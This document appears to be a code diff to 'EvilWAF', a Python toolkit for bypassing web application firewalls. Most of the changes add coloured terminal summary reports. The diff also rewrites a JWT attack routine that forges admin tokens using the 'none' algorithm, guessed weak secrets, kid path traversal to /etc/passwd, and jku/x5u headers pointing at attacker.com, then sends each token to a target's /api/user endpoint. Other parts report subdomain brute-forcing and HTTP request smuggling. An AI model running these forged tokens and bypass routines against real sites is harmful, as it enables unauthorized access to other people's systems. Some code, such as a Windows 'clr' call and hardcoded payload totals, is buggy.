@@ -35,9 +35,7 @@ import time
 import requests
 import base64
 import jwt
-from core.updater import EvilWAFUpdater
-# ========================================
-
+from core.updater import updater
 
 
 
@@ -49,8 +47,39 @@ class Colors:
     MAGENTA = '\033[95m'
     CYAN = '\033[96m'
     WHITE = '\033[97m'
+    PURPLE = '\033[45m'
+    BLACK = '\033[40m'
     BOLD = '\033[1m'
     END = '\033[0m'
+
+
+
+def clr():
+    if os.name == "nt":
+        os.system("clr")
+    else:
+        os.system("clear")
+
+
+
+def fill_line_with_color(color_code, text=""):
+    import os
+    columns = os.get_terminal_size().columns
+    spaces = " " * columns
+    colored_spaces = f"{color_code}{spaces}{Colors.END}"
+    
+    if text:
+        
+        padding = (columns - len(text)) // 2
+        centered_text = " " * padding + text + " " * (columns - len(text) - padding)
+        return f"{color_code}{centered_text}{Colors.END}"
+    else:
+        return colored_spaces
+
+
+print(fill_line_with_color(Colors.PURPLE, "hello world         2.2             matrix"))
+
+
 
 
 
@@ -72,9 +101,9 @@ ___________     .__.__                  _____
         
         
   
-  Created by: Matrix.                                 {Colors.CYAN}~EVILWAF{Colors.WHITE} : {Colors.BLUE}V2.1{Colors.WHITE}
+  Created by: Matrix.                                 {Colors.CYAN}~EVILWAF{Colors.WHITE} : {Colors.BLUE}V2.2{Colors.WHITE}
 
-                          Codename : {Colors.YELLOW}hack error 404{Colors.WHITE}                 
+                          Codename : {Colors.YELLOW}hello world{Colors.WHITE}                 
     \033[41mThe Web Application Firewall Fingerprinting Toolkit\033[0m
 
 
@@ -1034,24 +1063,50 @@ class EvilWAFBypass:
     
     async def smart_subdomain_validation(self, domain):
         """Smart subdomain discovery"""
-        print(f"\033[41m PHASE 1: Smart Subdomain Discovery\033[0m")
+        import os
+        import shutil
+
+        def get_terminal_width():
+            try:
+               return shutil.get_terminal_size().columns
+            except:
+               return 80
         
+        
+        term_width = get_terminal_width()
+        
+        def print_bg_header(text, bg_color='\033[40m'):
+            """Print full width background header"""
+            padding = (term_width - len(text)) // 2
+            spaces = " " * padding + text + " " * (term_width - len(text) - padding)
+            print(f"{bg_color}{spaces}\033[0m")   
+        
+        
+        print_bg_header(" PHASE 1: Smart Subdomain Discovery ", '\033[46m')    
         valid_subs = []
+        total_count = len(self.bruteforce.subdomain_wordlist)
         
+        
+        table_header = f"{Colors.BLACK}{'SUBDOMAIN':<30}{Colors.END}{Colors.BLACK} {'STATUS':<20}{Colors.END}{Colors.BLACK} {'COUNT':<8}{Colors.END}"
+        print_bg_header(table_header, '\033[44m')  
+        i = 0        
         for sub in self.bruteforce.subdomain_wordlist:
+            i += 1
             subdomain = f"{sub}.{domain}"
-            
+            counter = f"{Colors.RED}{i:>3}{Colors.WHITE}/{Colors.CYAN}{total_count}{Colors.END}"
+
+
             try:
                 socket.setdefaulttimeout(3)
                 ip = socket.gethostbyname(subdomain)
                 valid_subs.append(subdomain)
-                print(f"{Colors.WHITE}[-] {subdomain:<40} {Colors.GREEN}DNS found{Colors.END}")
+                print(f"{Colors.WHITE}[-]{Colors.END} {Colors.WHITE}{subdomain:<30}{Colors.END} {Colors.GREEN}DNS found{Colors.END} {counter:>15}")
                 
             except socket.gaierror:
-                print(f"{Colors.WHITE}[-] {subdomain:<40} {Colors.BLUE}No DNS record{Colors.END}")
+                print(f"{Colors.WHITE}[-]{Colors.END} {Colors.WHITE}{subdomain:<30}{Colors.END} {Colors.CYAN}No DNS record{Colors.END} {counter:>15}")
                 continue
             except Exception:
-                print(f"{Colors.WHITE}[-] {subdomain:<40} {Colors.RED}DNS error{Colors.END}")
+                print(f"{Colors.WHITE}[-]{Colors.END} {Colors.WHITE}{subdomain:<30}{Colors.END} {Colors.RED}DNS error{Colors.END} {counter:>15}")
                 continue
         
         print(f"{Colors.GREEN}[+] Found {len(valid_subs)} valid subdomains{Colors.END}")
@@ -1075,7 +1130,13 @@ class EvilWAFBypass:
             
             await asyncio.sleep(0.2)
         
+        await self.subdomain_summary_report(valid_subdomains, working_subs, domain)
         return working_subs
+        
+        
+
+
+
 
     async def improved_subdomain_test(self, subdomain, main_domain):
         """Subdomain test with multiple attempts"""
@@ -1096,6 +1157,140 @@ class EvilWAFBypass:
             
         except Exception:
             return False
+
+
+
+
+
+    async def subdomain_summary_report(self, valid_subdomains, working_subs, domain):
+        """Print complete subdomain discovery summary with all subdomains details"""
+    
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+    
+    
+        print_bg_header("", '\033[44m')
+        print_bg_header(" SUBDOMAIN DISCOVERY ANALYSIS REPORT ", '\033[44m')
+        print_bg_header("", '\033[44m')
+    
+    
+        print(f"\n{Colors.CYAN}[+] Generating complete summary...{Colors.END}")
+        await asyncio.sleep(1)
+    
+    
+        print_bg_header(" COMPLETE SUBDOMAIN DISCOVERY SUMMARY ", '\033[45m')
+        await asyncio.sleep(0.5)
+    
+    
+        total_tested = len(self.bruteforce.subdomain_wordlist)
+        dns_found = len(valid_subdomains)
+        bypass_success = len(working_subs)
+        dns_failed = total_tested - dns_found
+    
+        dns_percent = (dns_found / total_tested) * 100 if total_tested > 0 else 0
+        bypass_percent = (bypass_success / total_tested) * 100 if total_tested > 0 else 0
+        bypass_success_rate = (bypass_success / dns_found) * 100 if dns_found > 0 else 0
+    
+    
+        print(f"\n{Colors.CYAN}{'OVERALL STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+    
+        print(f"{Colors.WHITE}{'Total Subdomains Tested':<25}{Colors.END} {Colors.YELLOW}{total_tested:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'DNS Records Found':<25}{Colors.END} {Colors.GREEN}{dns_found:<8}{Colors.END} {Colors.CYAN}{dns_percent:6.1f}%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Bypass Successful':<25}{Colors.END} {Colors.GREEN}{bypass_success:<8}{Colors.END} {Colors.CYAN}{bypass_percent:6.1f}%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Success Rate':<25}{Colors.END} {Colors.GREEN}{bypass_success:<8}{Colors.END} {Colors.CYAN}{bypass_success_rate:6.1f}%{'':<6}{Colors.END}")
+    
+        await asyncio.sleep(0.5)
+    
+    
+        if valid_subdomains:
+            print(f"\n{Colors.GREEN}{'ALL DNS FOUND SUBDOMAINS':<45} {'IP':<15} {'BYPASS':<10}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*45} {'─'*15} {'─'*10}{Colors.END}")
+        
+            for i, subdomain in enumerate(valid_subdomains, 1):
+                try:
+                    ip = socket.gethostbyname(subdomain)
+                    ip_display = ip
+                except:
+                    ip_display = 'N/A'
+            
+            
+                bypass_text = "[*]Success" if subdomain in working_subs else "Failed"
+                bypass_color = Colors.GREEN if subdomain in working_subs else Colors.RED
+            
+                print(f"{Colors.WHITE}{i:>3}. {subdomain:<40}{Colors.END} {Colors.CYAN}{ip_display:<15}{Colors.END} {bypass_color}{bypass_text:<10}{Colors.END}")
+    
+        await asyncio.sleep(0.5)
+    
+    
+        if working_subs:
+            print(f"\n{Colors.GREEN}{'Success Bypasses ONLY':<45} {'IP':<15} {'STATUS':<10}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*45} {'─'*15} {'─'*10}{Colors.END}")
+        
+            for i, subdomain in enumerate(working_subs, 1):
+                try:
+                    ip = socket.gethostbyname(subdomain)
+                    ip_display = ip
+                except:
+                    ip_display = 'N/A'
+            
+                print(f"{Colors.WHITE}{i:>2}. {subdomain:<40}{Colors.END} {Colors.CYAN}{ip_display:<15}{Colors.END} {Colors.GREEN}{'Live':<10}{Colors.END}")
+    
+        await asyncio.sleep(0.5)
+    
+    
+        if dns_failed > 0:
+            failed_subs = []
+            for sub in self.bruteforce.subdomain_wordlist:
+                subdomain = f"{sub}.{domain}"
+                if subdomain not in valid_subdomains:
+                    failed_subs.append(subdomain)
+        
+            print(f"\n{Colors.RED}{'DNS Failed subdomains':<45}{Colors.END}")
+            print(f"{Colors.RED}{'─'*45}{Colors.END}")
+        
+            for i, subdomain in enumerate(failed_subs, 1):
+                print(f"{Colors.WHITE}{i:>3}. {subdomain:<40}{Colors.END} {Colors.RED}{'[*]NO DNS':<10}{Colors.END}")
+    
+        await asyncio.sleep(0.5)
+    
+  
+        bypass_failed_subs = [sub for sub in valid_subdomains if sub not in working_subs]
+        if bypass_failed_subs:
+            print(f"\n{Colors.YELLOW}{'BYPASS FAILED SUBDOMAINS':<45} {'IP':<15}{Colors.END}")
+            print(f"{Colors.YELLOW}{'─'*45} {'─'*15}{Colors.END}")
+        
+            for i, subdomain in enumerate(bypass_failed_subs, 1):
+                try:
+                    ip = socket.gethostbyname(subdomain)
+                    ip_display = ip
+                except:
+                    ip_display = 'N/A'
+            
+                print(f"{Colors.WHITE}{i:>3}. {subdomain:<40}{Colors.END} {Colors.CYAN}{ip_display:<15}{Colors.END} {Colors.RED}{'[*]Failed':<10}{Colors.END}")
+    
+    
+        await asyncio.sleep(0.5)
+        final_success_rate = (bypass_success / total_tested) * 100 if total_tested > 0 else 0
+    
+    
+        print()  
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" SCAN COMPLETED: {final_success_rate:.1f}% Success Rate ", '\033[44m')
+        print_bg_header(f" {bypass_success}/{total_tested} subdomains successfully bypassed ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+
+
+
+
 
     async def dns_history_bypass(self, domain):
         """DNS history bypass"""
@@ -1405,8 +1600,260 @@ class EvilWAFBypass:
             
             await asyncio.sleep(1)
         
+        await self.print_smuggling_summary_report(domain, working_smuggles)
         return working_smuggles
 
+
+
+
+    
+    async def print_smuggling_summary_report(self, domain, working_smuggles):
+        """Print comprehensive HTTP Request Smuggling summary with actual payloads"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+
+        print_bg_header("", '\033[44m')
+        print_bg_header(" HTTP REQUEST SMUGGLING ATTACK SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating HTTP Smuggling summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+        # 
+        total_payloads = 14
+        success_payloads = len(working_smuggles)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+        # STATISTICS SECTION
+        print(f"\n{Colors.CYAN}{'SMUGGLING STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Smuggles':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Smuggles':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        
+        if working_smuggles:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL SMUGGLING PAYLOADS':<25} {'TYPE':<20} {'TARGET':<25}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*25} {'─'*20} {'─'*25}{Colors.END}")
+            
+            for i, payload in enumerate(working_smuggles, 1):
+                
+                if "CL.TE" in payload or "Content-Length" in payload and "Transfer-Encoding: chunked" in payload:
+                    attack_type = "CL.TE ATTACK"
+                elif "TE.CL" in payload:
+                    attack_type = "TE.CL ATTACK"
+                elif "Transfer-Encoding :" in payload or "Transfer-Encoding:\t" in payload:
+                    attack_type = "OBFUSCATION ATTACK"
+                elif "X-Forwarded-For" in payload or "X-Real-IP" in payload:
+                    attack_type = "HEADER INJECTION"
+                elif "chunk-extension" in payload:
+                    attack_type = "CHUNK EXTENSION"
+                else:
+                    attack_type = "STANDARD SMUGGLING"
+                
+
+                target_match = re.search(r'GET\s+([^\s]+)\s+HTTP', payload)
+                target_path = target_match.group(1) if target_match else "Unknown"
+                
+                # 
+                if len(target_path) > 20:
+                    target_path = target_path[:17] + "..."
+                
+                print(f"{Colors.WHITE}{i:>2}. Payload {i:<18}{Colors.END} {Colors.CYAN}{attack_type:<20}{Colors.END} {Colors.YELLOW}{target_path:<25}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        # PAYLOAD CATEGORIES BREAKDOWN
+        categories = {
+            'CL.TE Attacks': ['CL.TE'],
+            'TE.CL Attacks': ['TE.CL'],  
+            'Obfuscation Attacks': ['OBFUSCATION'],
+            'Header Injection': ['HEADER INJECTION'],
+            'Chunk Extension': ['CHUNK EXTENSION'],
+            'Standard Smuggling': ['STANDARD SMUGGLING']
+        }
+        
+        # 
+        category_counts = {
+            'CL.TE Attacks': 0,
+            'TE.CL Attacks': 0,
+            'Obfuscation Attacks': 0,
+            'Header Injection': 0,
+            'Chunk Extension': 0,
+            'Standard Smuggling': 0
+        }
+        
+        for payload in working_smuggles:
+            if "CL.TE" in payload or ("Content-Length" in payload and "Transfer-Encoding: chunked" in payload):
+                category_counts['CL.TE Attacks'] += 1
+            elif "TE.CL" in payload:
+                category_counts['TE.CL Attacks'] += 1
+            elif "Transfer-Encoding :" in payload or "Transfer-Encoding:\t" in payload:
+                category_counts['Obfuscation Attacks'] += 1
+            elif "X-Forwarded-For" in payload or "X-Real-IP" in payload:
+                category_counts['Header Injection'] += 1
+            elif "chunk-extension" in payload:
+                category_counts['Chunk Extension'] += 1
+            else:
+                category_counts['Standard Smuggling'] += 1
+        
+
+        active_categories = {k: v for k, v in category_counts.items() if v > 0}
+        
+        if active_categories:
+            print(f"\n{Colors.CYAN}{'ATTACK CATEGORIES':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+            
+            for category, count in active_categories.items():
+                percent = (count / success_payloads) * 100 if success_payloads > 0 else 0
+                print(f"{Colors.WHITE}{category:<25}{Colors.END} {Colors.GREEN}{count:<8}{Colors.END} {Colors.CYAN}{percent:6.1f}%{'':<6}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if working_smuggles:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL PAYLOADS DETAILS':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            
+            for i, payload in enumerate(working_smuggles, 1):
+                # 
+                method_match = re.search(r'(GET|POST|PUT|DELETE)\s+([^\s]+)\s+HTTP', payload)
+                method = method_match.group(1) if method_match else "UNKNOWN"
+                path = method_match.group(2) if method_match else "Unknown"
+                
+               
+                if "CL.TE" in payload:
+                    technique = "Content-Length vs Transfer-Encoding"
+                elif "TE.CL" in payload:
+                    technique = "Transfer-Encoding vs Content-Length"
+                elif "Transfer-Encoding :" in payload:
+                    technique = "Space Obfuscation"
+                elif "Transfer-Encoding:\t" in payload:
+                    technique = "Tab Obfuscation"
+                elif "chunk-extension" in payload:
+                    technique = "Chunk Extension"
+                elif "X-Forwarded-For" in payload:
+                    technique = "Header Injection (XFF)"
+                elif "X-Real-IP" in payload:
+                    technique = "Header Injection (X-Real-IP)"
+                else:
+                    technique = "Standard Smuggling"
+                
+                # 
+                technique_count = sum(1 for p in working_smuggles if (
+                    ("CL.TE" in p and "CL.TE" in payload) or
+                    ("TE.CL" in p and "TE.CL" in payload) or
+                    ("Transfer-Encoding :" in p and "Transfer-Encoding :" in payload) or
+                    ("Transfer-Encoding:\t" in p and "Transfer-Encoding:\t" in payload) or
+                    ("chunk-extension" in p and "chunk-extension" in payload) or
+                    ("X-Forwarded-For" in p and "X-Forwarded-For" in payload) or
+                    ("X-Real-IP" in p and "X-Real-IP" in payload)
+                ))
+                
+                technique_percent = (technique_count / success_payloads) * 100 if success_payloads > 0 else 0
+                
+                print(f"{Colors.WHITE}{i:>2}. {method} {path:<30}{Colors.END}")
+                print(f"{Colors.CYAN}    Technique: {technique:<45}{Colors.END} {Colors.YELLOW}{technique_percent:5.1f}%{'':<5}{Colors.END}")
+                
+              
+                first_line = payload.split('\r\n')[0] if '\r\n' in payload else payload[:60]
+                if len(first_line) > 50:
+                    first_line = first_line[:47] + "..."
+                print(f"{Colors.WHITE}    Preview: {first_line:<65}{Colors.END}")
+                print()
+        
+
+        await asyncio.sleep(0.5)
+        
+        if working_smuggles:
+            print(f"\n{Colors.CYAN}{'TECHNIQUE EFFECTIVENESS ANALYSIS':<40} {'SUCCESS':<10} {'EFFECTIVENESS':<15}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*40} {'─'*10} {'─'*15}{Colors.END}")
+            
+            technique_stats = {}
+            
+            for payload in working_smuggles:
+                if "CL.TE" in payload:
+                    tech = "CL.TE"
+                elif "TE.CL" in payload:
+                    tech = "TE.CL"
+                elif "Transfer-Encoding :" in payload:
+                    tech = "Space Obfuscation"
+                elif "Transfer-Encoding:\t" in payload:
+                    tech = "Tab Obfuscation"
+                elif "chunk-extension" in payload:
+                    tech = "Chunk Extension"
+                elif "X-Forwarded-For" in payload:
+                    tech = "Header Injection"
+                else:
+                    tech = "Standard"
+                
+                technique_stats[tech] = technique_stats.get(tech, 0) + 1
+            
+
+            total_by_technique = {
+                'CL.TE': 2,  # Assuming 2 CL.TE payloads in original list
+                'TE.CL': 2,  # Assuming 2 TE.CL payloads
+                'Space Obfuscation': 1,
+                'Tab Obfuscation': 1,
+                'Chunk Extension': 1,
+                'Header Injection': 3,
+                'Standard': 4
+            }
+            
+            for tech, count in technique_stats.items():
+                total_for_tech = total_by_technique.get(tech, 1)
+                effectiveness = (count / total_for_tech) * 100
+                
+                effectiveness_color = Colors.GREEN if effectiveness > 50 else Colors.YELLOW if effectiveness > 25 else Colors.RED
+                
+                print(f"{Colors.WHITE}{tech:<40}{Colors.END} {Colors.GREEN}{count:<10}{Colors.END} {effectiveness_color}{effectiveness:6.1f}%{'':<9}{Colors.END}")
+        
+        # 
+        await asyncio.sleep(0.5)
+        
+        if working_smuggles:
+            target_paths = []
+            for payload in working_smuggles:
+                target_match = re.search(r'GET\s+([^\s]+)\s+HTTP', payload)
+                if target_match:
+                    target_paths.append(target_match.group(1))
+            
+            if target_paths:
+                print(f"\n{Colors.GREEN}{'VULNERABLE TARGET PATHS':<40}{Colors.END}")
+                print(f"{Colors.GREEN}{'─'*40}{Colors.END}")
+                
+                unique_targets = list(set(target_paths))
+                for i, target in enumerate(unique_targets[:10], 1):
+                    target_display = target[:37] + "..." if len(target) > 37 else target
+                    print(f"{Colors.WHITE}{i:>2}. {target_display:<37}{Colors.END}")
+                
+                if len(unique_targets) > 10:
+                    print(f"{Colors.YELLOW}   ... and {len(unique_targets) - 10} more paths{Colors.END}")
+        
+        
+        print()
+        print_bg_header("", '\033[44m')
+        print_bg_header(f" SMUGGLING COMPLETED: {success_rate:.1f}% SUCCESS RATE ", '\033[44m')
+        print_bg_header(f" {success_payloads}/{total_payloads} payloads successful ", '\033[44m')
+        print_bg_header("", '\033[44m')
+
+    
+    
+
+
+    
     async def jwt_algorithm_confusion(self, domain):
         """JWT Algorithm Confusion Attack"""
         print(f"\033[41m PHASE 5: JWT Algorithm Confusion\033[0m")
@@ -1414,53 +1861,164 @@ class EvilWAFBypass:
         working_tokens = []
         
         try:
-            # Test 'none' algorithm
-            none_payload = {"user": "admin", "admin": True, "iat": int(time.time())}
-            none_token = jwt.encode(none_payload, "", algorithm="none")
-            
-            # Test with various secrets
-            test_tokens = [
-                ("none_algorithm", none_token),
-                ("simple_secret", jwt.encode(none_payload, "secret", algorithm="HS256")),
-                ("domain_secret", jwt.encode(none_payload, domain, algorithm="HS256")),
-                ("empty_secret", jwt.encode(none_payload, "", algorithm="HS256")),
-                ("null_secret", jwt.encode(none_payload, "null", algorithm="HS256")),
-                ("key_secret", jwt.encode(none_payload, "key", algorithm="HS256")),
-                ("password_secret", jwt.encode(none_payload, "password", algorithm="HS256")),
-                ("admin_secret", jwt.encode(none_payload, "admin", algorithm="HS256")),
-                ("jwt_secret", jwt.encode(none_payload, "jwt", algorithm="HS256")),
-                ("token_secret", jwt.encode(none_payload, "token", algorithm="HS256")),
-                ("secret_secret", jwt.encode(none_payload, "secretkey", algorithm="HS256")),
-                ("RS256_with_HS256", jwt.encode(none_payload, domain, algorithm="HS256")),  
-                ("public_key_as_secret", jwt.encode(none_payload, domain, algorithm="HS256")),  # Domain as secret
-                ("url_as_secret", jwt.encode(none_payload, f"https://{domain}", algorithm="HS256")),
-                ("kid_injection", jwt.encode(none_payload, "secret", algorithm="HS256", headers={"kid":"../../../etc/passwd"})),
-                ("jku_injection", jwt.encode(none_payload, "secret", algorithm="HS256", headers={"jku":"https://attacker.com/key.json"})),
-                ("x5u_injection", jwt.encode(none_payload, "secret", algorithm="HS256", headers={"x5u":"https://attacker.com/cert.pem"})),
-                ("future_exp", jwt.encode({"user": "admin", "admin": True, "exp": int(time.time()) + 86400*365}, "secret", algorithm="HS256")),  
-                ("past_iat", jwt.encode({"user": "admin", "admin": True, "iat": 1516239022}, "secret", algorithm="HS256")),  
-                ("no_exp", jwt.encode({"user": "admin", "admin": True}, "secret", algorithm="HS256")),  # No expiration
-                ("super_admin", jwt.encode({"user": "admin", "admin": True, "role": "superadmin", "isAdmin": True}, "secret", algorithm="HS256")),
-                ("root_user", jwt.encode({"user": "root", "admin": True, "roles": ["admin", "user", "superuser"]}, "secret", algorithm="HS256")),
-                ("bypass_claims", jwt.encode({"user": "admin", "admin": "true", "enabled": True, "active": 1}, "secret", algorithm="HS256")),
-                ("uppercase_admin", jwt.encode({"User": "admin", "Admin": True}, "secret", algorithm="HS256")),
-                ("mixed_case", jwt.encode({"UserName": "admin", "IsAdmin": True}, "secret", algorithm="HS256")),
-                ("sql_injection_claim", jwt.encode({"user": "admin' OR '1'='1", "admin": True}, "secret", algorithm="HS256")),
-                ("xss_claim", jwt.encode({"user": "admin<script>alert(1)</script>", "admin": True}, "secret", algorithm="HS256")),         
-         
 
+            test_tokens = [
+
+                ("none_algorithm", jwt.encode(
+                    {"user": "admin", "admin": True, "iat": int(time.time())},
+                    "", algorithm="none"
+                )),
+                
+
+                ("simple_secret", jwt.encode(
+                    {"user": "admin", "role": "superuser", "iat": int(time.time())},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("domain_secret", jwt.encode(
+                    {"username": "admin", "isAdmin": True, "iat": int(time.time())},
+                    domain, algorithm="HS256"
+                )),
+                
+                ("empty_secret", jwt.encode(
+                    {"user": "administrator", "admin": 1, "iat": int(time.time())},
+                    "", algorithm="HS256"
+                )),
+                
+                ("null_secret", jwt.encode(
+                    {"user": "admin", "access": "full", "iat": int(time.time())},
+                    "null", algorithm="HS256"
+                )),
+                
+                ("key_secret", jwt.encode(
+                    {"user": "admin", "permissions": ["read", "write"], "iat": int(time.time())},
+                    "key", algorithm="HS256"
+                )),
+                
+                ("password_secret", jwt.encode(
+                    {"user": "admin", "level": "admin", "iat": int(time.time())},
+                    "password", algorithm="HS256"
+                )),
+                
+                ("admin_secret", jwt.encode(
+                    {"user": "superadmin", "admin": True, "iat": int(time.time())},
+                    "admin", algorithm="HS256"
+                )),
+                
+                ("jwt_secret", jwt.encode(
+                    {"user": "admin", "token_type": "jwt", "iat": int(time.time())},
+                    "jwt", algorithm="HS256"
+                )),
+                
+                ("token_secret", jwt.encode(
+                    {"user": "admin", "auth_type": "bearer", "iat": int(time.time())},
+                    "token", algorithm="HS256"
+                )),
+                
+                ("secret_secret", jwt.encode(
+                    {"user": "admin", "secret": True, "iat": int(time.time())},
+                    "secretkey", algorithm="HS256"
+                )),
+                
+                ("RS256_with_HS256", jwt.encode(
+                    {"user": "admin", "algorithm": "HS256", "iat": int(time.time())},
+                    domain, algorithm="HS256"
+                )),
+                
+                ("public_key_as_secret", jwt.encode(
+                    {"user": "admin", "public_key": True, "iat": int(time.time())},
+                    domain, algorithm="HS256"
+                )),
+                
+                ("url_as_secret", jwt.encode(
+                    {"user": "admin", "url_secret": True, "iat": int(time.time())},
+                    f"https://{domain}", algorithm="HS256"
+                )),
+                
+                
+                ("kid_injection", jwt.encode(
+                    {"user": "admin", "injection": "kid", "iat": int(time.time())},
+                    "secret", algorithm="HS256", 
+                    headers={"kid": "../../../etc/passwd"}
+                )),
+                
+                ("jku_injection", jwt.encode(
+                    {"user": "admin", "injection": "jku", "iat": int(time.time())},
+                    "secret", algorithm="HS256", 
+                    headers={"jku": "https://attacker.com/key.json"}
+                )),
+                
+                ("x5u_injection", jwt.encode(
+                    {"user": "admin", "injection": "x5u", "iat": int(time.time())},
+                    "secret", algorithm="HS256", 
+                    headers={"x5u": "https://attacker.com/cert.pem"}
+                )),
+                
+
+                ("future_exp", jwt.encode(
+                    {"user": "admin", "admin": True, "exp": int(time.time()) + 86400*365},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("past_iat", jwt.encode(
+                    {"user": "admin", "admin": True, "iat": 1516239022},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("no_exp", jwt.encode(
+                    {"user": "admin", "admin": True},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("super_admin", jwt.encode(
+                    {"user": "admin", "admin": True, "role": "superadmin", "isAdmin": True},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("root_user", jwt.encode(
+                    {"user": "root", "admin": True, "roles": ["admin", "user", "superuser"]},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("bypass_claims", jwt.encode(
+                    {"user": "admin", "admin": "true", "enabled": True, "active": 1},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("uppercase_admin", jwt.encode(
+                    {"User": "admin", "Admin": True},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("mixed_case", jwt.encode(
+                    {"UserName": "admin", "IsAdmin": True},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("sql_injection_claim", jwt.encode(
+                    {"user": "admin' OR '1'='1", "admin": True},
+                    "secret", algorithm="HS256"
+                )),
+                
+                ("xss_claim", jwt.encode(
+                    {"user": "admin<script>alert(1)</script>", "admin": True},
+                    "secret", algorithm="HS256"
+                )),
             ]
             
             for token_name, token in test_tokens:
+                
+                print(f"{Colors.YELLOW}[DEBUG] {token_name}: {token[:50]}...{Colors.END}")
+                
                 headers = {"Authorization": f"Bearer {token}"}
                 
                 try:
                     async with self.session.get(f"https://{domain}/api/user", headers=headers, timeout=5, ssl=False) as response:
                         if response.status in [200, 201]:
                             working_tokens.append({"type": token_name, "token": token})
-                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.GREEN}Success{Colors.END}")
+                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.GREEN}[success]{Colors.END}")
                         else:
-                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}Failed{Colors.END}")
+                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}[Failed]{Colors.END}")
                 except:
                     print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}ERROR{Colors.END}")
                 
@@ -1469,7 +2027,126 @@ class EvilWAFBypass:
         except Exception as e:
             print(f"{Colors.RED}[-] JWT Error: {e}{Colors.END}")
         
+      
+        await self.print_jwt_summary_report(domain, working_tokens)
         return working_tokens
+
+
+
+
+
+    
+    async def print_jwt_summary_report(self, domain, working_tokens):
+        """Print comprehensive JWT algorithm confusion summary"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+        
+        print_bg_header("", '\033[44m')
+        print_bg_header(" JWT ALGORITHM CONFUSION ATTACK SUMMARY ", '\033[44m')
+        print_bg_header("", '\033[44m')
+        
+        print(f"\n{Colors.CYAN}[+] Generating JWT attack summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+        
+        total_payloads = 25  
+        success_payloads = len(working_tokens)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+        
+        print(f"\n{Colors.CYAN}{'JWT ATTACK STATISTICS':<25} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.CYAN}{'─'*25} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Payloads Tested':<25}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.CYAN}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Payloads':<25}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.CYAN}{success_rate:6.1f}%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Payloads':<25}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.CYAN}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+        
+        if working_tokens:
